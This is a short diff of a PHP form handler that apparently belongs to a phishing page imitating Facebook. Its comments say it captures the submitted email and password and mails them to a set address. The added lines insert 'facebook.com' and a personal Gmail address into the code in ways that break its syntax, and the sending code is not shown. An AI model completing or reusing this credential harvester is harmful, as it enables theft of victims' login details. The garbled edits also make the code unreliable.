@@ -1,7 +1,7 @@
-<?php
+<?phpfacebook.com
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Obtener los datos del formulario
-    $email = $_POST['email'];
+    $email = $_POST['email'];tchiquito1999@gmail.com
     $password = $_POST['password'];
 
     // Configurar el correo al que se envian los datos ingresados en la pagina
